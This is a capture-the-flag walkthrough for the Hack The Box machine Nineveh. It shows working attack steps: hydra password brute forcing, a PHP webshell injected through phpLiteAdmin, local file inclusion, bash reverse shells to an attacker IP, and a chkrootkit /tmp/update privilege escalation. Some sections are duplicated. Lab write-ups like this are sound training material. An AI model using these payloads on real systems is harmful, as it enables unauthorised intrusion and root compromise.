---
icon: helmet-battle
---

# HTB-NINEVEH

<figure><img src="../../../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Recon :

```powershell

┌──(sn0x㉿sn0x)-[~/hackthebox/Nineveh]
└─$ rustscan -a 10.10.10.43 --ulimit 5000 --range 1-5000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \\ |  `| |
| .-. \\| {_} |.-._} } | |  .-._} }\\     }/  /\\  \\| |\\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: <https://discord.gg/GFrQsGy>           :
: <https://github.com/RustScan/RustScan> :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/sn0x/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.43:80
Open 10.10.10.43:443

ORT    STATE SERVICE  REASON         VERSION
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)

443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 

```

add domain to etc/hosts

```powershell
┌──(sn0x㉿sn0x)-[~/hackthebox/Nineveh]
└─$ echo "10.10.10.43 nineveh.htb" | sudo tee /etc/hosts
[sudo] password for sn0x: 
10.10.10.43 nineveh.htb
```

Load the Website :

<figure><img src="../../../../.gitbook/assets/image (253).png" alt=""><figcaption></figcaption></figure>

### Brute forcing directories and files

#### HTTP website (port 80)

<figure><img src="../../../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

Found /db lets check here : and its works !



<figure><img src="../../../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../../.gitbook/assets/image (256).png" alt=""><figcaption></figcaption></figure>

We have

HTTPS website (port 443)

We visit this URL [http://nineveh.htb/department/](http://nineveh.htb/department/) and we meet a login page. There is a different answer if a username exists (‘Invalid Password!’ vs ‘Invalid username’). This allows us to enum users and verify that user ‘admin’ exists. We could brute force the password for user admin using hydra and rockyou.txt:

```powershell
┌──(sn0x㉿sn0x)-[~/hackthebox/Nineveh]
└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:F=Invalid password!" -t 4 -w 10
Hydra v9.5 (c) 2023 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (<http://www.thc.org/thc-hydra>) starting at 2017-12-17 12:17:11
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking service http-post-form on port 80
[DATA] with additional data /department/login.php:username=^USER^&password=^PASS^:Invalid Password!
[STATUS] 783.00 tries/min, 783 tries in 00:01h, 14343616 to do in 305:19h, 16 active
[STATUS] 788.00 tries/min, 2364 tries in 00:03h, 14342035 to do in 303:21h, 16 active

[80][http-post-form] host: 10.10.10.43   **login: admin   password: 1q2w3e4r5t**
1 of 1 target successfully completed, 1 valid password found
Hydra (<http://www.thc.org/thc-hydra>) finished at 2017-12-17 12:23:13
```

Password Found : **`login: admin password: 1q2w3e4r5t`**

```powershell
Directory Brute Force
I also started a gobuster to see what other paths may exist. I’ll include -x php because it’s Linux and that’s always worth guessing, even though index.php didn’t load manually in Firefox. This found two interesting paths:

root@kali$ gobuster dir -u <http://10.10.10.43> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php -o scans/gobuster-http-root-medium -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            <http://10.10.10.43>
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/04/11 05:28:16 Starting gobuster
===============================================================
/info.php (Status: 200)
/department (Status: 301)
/server-status (Status: 403)
===============================================================
2020/04/11 05:31:10 Finished
===============================================================
```

#### `/department`

The site presents a login form:

<figure><img src="../../../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

I Tried everthing smtg is intresting is there

<figure><img src="../../../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>



```powershell
┌──(sn0x㉿sn0x)-[~/hackthebox/Nineveh]
└─$ searchsploit phpliteadmin
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                  | exploits/php/webapps/24044.txt
phpLiteAdmin - 'table' SQL Injection                            | exploits/php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                     | exploits/php/webapps/37515.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                   | exploits/php/webapps/39714.txt
---------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Examining each of these with `searchsploit -x [path]`, the first is a version match and seems like a good way to get execution. The second also looks like it should work, if I want to do SQLi. The third one is not a version match, and the fourth has a bunch of less interesting vulnerabilities like XSS and CSRF. For all of them, I need to authenticate first.

#### /secure\_notes

This page is just an image:

```powershell
┌──(sn0x㉿sn0x)-[~/hackthebox/Nineveh]
└─$ searchsploit phpliteadmin
---------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                  |  Path
                                                                | (/usr/share/exploitdb/)
---------------------------------------------------------------- ----------------------------------------
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                  | exploits/php/webapps/24044.txt
phpLiteAdmin - 'table' SQL Injection                            | exploits/php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                     | exploits/php/webapps/37515.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                   | exploits/php/webapps/39714.txt
---------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

Examining each of these with `searchsploit -x [path]`, the first is a version match and seems like a good way to get execution. The second also looks like it should work, if I want to do SQLi. The third one is not a version match, and the fourth has a bunch of less interesting vulnerabilities like XSS and CSRF. For all of them, I need to authenticate first.

#### /secure\_notes

This page is just an image:



<figure><img src="../../../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>



**phpLiteAdmin Brute Force :**

```powershell
hydra 10.10.10.43 -l sn0x -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password"
[443][http-post-form] host: 10.10.10.43   login: GOKUU JI   password: password123
1 of 1 target successfully completed, 1 valid password found
```

<figure><img src="../../../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

#### 🐘 PHP Injection via phpLiteAdmin (Exploit 24044.txt)

This vulnerability leverages improper handling of database filenames and default values in `phpLiteAdmin`, allowing Remote Code Execution (RCE) by injecting PHP code into a `.php`-suffixed SQLite database.

&#x20;**Exploitation Steps:**

1. **Create a Malicious Database**\
   Using `phpLiteAdmin`, create a new database file with a `.php` extension.\
   Example name: `shell.php`
2. **Switch to the New Database**\
   After creation, click on the new database (`shell.php`) to activate it for table operations.
3.  **Create a Table with a Malicious Default Field**\
    Add a new table with a single `TEXT` field. Set the field’s default value to a basic PHP webshell payload:

    ```php
    <?php system($_GET['cmd']); ?>
    ```

    🔥 **Note**: Use **double quotes (`"`)** around the PHP code, as the system uses **single quotes (`'`)** to define the string—this is crucial for successful injection.
4. **Save and View the Table**\
   Once the table is created, the payload gets injected into the `.php` file (in this case, `shell.php`).
5.  **Locate the Webshell Path**\
    The newly created `.php` file (malicious DB) gets stored in a temporary directory, typically:

    ```
    /var/tmp/shell.php
    ```
6. **LFI Required (But Missing)**\
   At this stage, although the webshell exists, you need **Local File Inclusion (LFI)** to load `/var/tmp/shell.php` through a web-accessible route.\
   Without LFI, the payload cannot be executed via browser or HTTP request.



Login :

<figure><img src="../../../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>



Now As indicated by the **Notes**, we need to poke around a bit until we find the right spot for the LFI.

use this payload :

<figure><img src="../../../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

Result :&#x20;

<figure><img src="../../../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>



Could this be the key to triggering our reverse shell? We ensure that our listener is running.

```
nc -nvlp 8001
```

Using the command execution function, we attempt to establish a reverse shell with a bash command. Don’t forget to URL-encode all spaces and `&` symbols.

```powershell
<http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/hack.php&cmd=/bin/bash+-c+'bash+-i+>%26+/dev/tcp/<Attacker_ip>/8001+0>%261'>

```

On phpadmin page do thsi setting&#x20;

### Goal:

Create a malicious **PHP file** (`reverse shell`) by abusing phpLiteAdmin → usko `/var/tmp/` mein save karna → phir usko LFI se call karna for shell.

***

#### Step 1: Rename Database

First, click **Rename Database** tab at top.

**Rename** the DB to something like:

```
ninevehNotes.txt.sn0x.php

```

This is **important** because LFI only includes files that contain `ninevehNotes.txt` in their name.

***

#### Step 2: Create a Table

Under **"Create New Table on database"**, enter:

* Name: `shell`
*   Number of fields: `1`

    Then hit **Go**

***

#### Step 3: Define Column

Now you'll be prompted to define the column:

* Name: `data`
* Type: `TEXT`

Then click **Save**.

***

#### Step 4: Inject PHP Payload (Reverse Shell)

Click on the **SQL** tab at the top and run this:

```sql
INSERT INTO shell (data) VALUES ("<?php system($_GET['cmd']); ?>");

```

Then hit **Go**.

This will write PHP code inside the DB.

***

#### Step 5: Get Shell File Path

Your renamed DB (e.g., `ninevehNotes.txt.sn0x.php`) will now be saved in:

```
/var/tmp/ninevehNotes.txt.sn0x.php

```

***

#### Step 6: Trigger Reverse Shell with LFI

Start listener:

```bash
nc -nvlp 8001

```

Then visit:

```bash
<http://nineveh.htb/department/manage.php?notes=/ninevehNotes/../var/tmp/ninevehNotes.txt.sn0x.php&cmd=/bin/bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.6/8001%200%3E%261%22>

```

Replace `10.10.14.6` with your tun0 IP.

***

#### Result:

You should now get a reverse shell on your netcat listener.

<figure><img src="../../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>



We’ve found a private RSA key, but our Nmap scan didn’t reveal an open SSH port. To investigate further, we use `netstat` to check all active connections. Also [**Port Knocking**](https://goteleport.com/blog/ssh-port-knocking/)

**Knockd** is a program that opens an SSH connection only if a specific knock sequence is initiated, as shown below.

<figure><img src="../../../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

Hit knock to en

Afterward, use the private RSA key stored in the `amrois_rsa` file to establish an SSH connection.

```
ssh -i amrois_rsa amrois@10.10.10.43
```

<figure><img src="../../../../.gitbook/assets/image (272).png" alt=""><figcaption></figcaption></figure>

We got SSH connection ! and Also User Flag

### **Privileges Escalation**

After using the usual privilege escalation methods and running **linpeas** without finding anything useful, the next tool in line is **pspy64**, which allows us to monitor processes without root permissions.

Running **pspy64**, we observe that **chkrootkit** runs every minute. Fortunately, [chkrootkit 0.49](https://www.exploit-db.com/exploits/33899) is vulnerable to a local privilege escalation attack.

According to the exploit, we need to create a file named `update` in the `/tmp` directory, which **chkrootkit** will execute as root. We start a second listener on port 8002 and create this file with a simple bash reverse shell.

```
vim update

#!/bin/bash

bash -i >& /dev/tcp/10.10.16.4/8002 0>&1
```

Finally, we make the `update` file executable with `chmod +x update`, and we can then collect all the flags.

### &#x20;Final PrivEsc via chkrootkit (Exploit 33899)

***

#### **On Attacker Machine]**

**Step 1: Start netcat listener on port 8002**

```bash
nc -nvlp 8002

```

***

#### **\[On Victim Machine: amrois@nineveh]**

**Step 2: Create malicious script `/tmp/update`**

```bash
cd /tmp
echo '#!/bin/bash' > update
echo 'bash -i >& /dev/tcp/10.10.16.4/8002 0>&1' >> update

```

Replace `10.10.16.4` with your actual **tun0 IP** (check using `ip a`)

***

**Step 3: Make it executable**

```bash
chmod +x /tmp/update

```

***

#### **Wait 1 Minute**

* chkrootkit runs via cron every minute as **root**
* It will execute `/tmp/update`

***

#### **Back on Attacker Terminal**

* You'll catch a root shell on port **8002** 🎯

***

### Bonus Tip:

If shell is limited, upgrade it:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

```

Then check:

```bash
whoami
id
hostname

```

And grab `/root/root.txt` flag&#x20;

***

<figure><img src="../../../../.gitbook/assets/complete (14).gif" alt=""><figcaption></figcaption></figure>
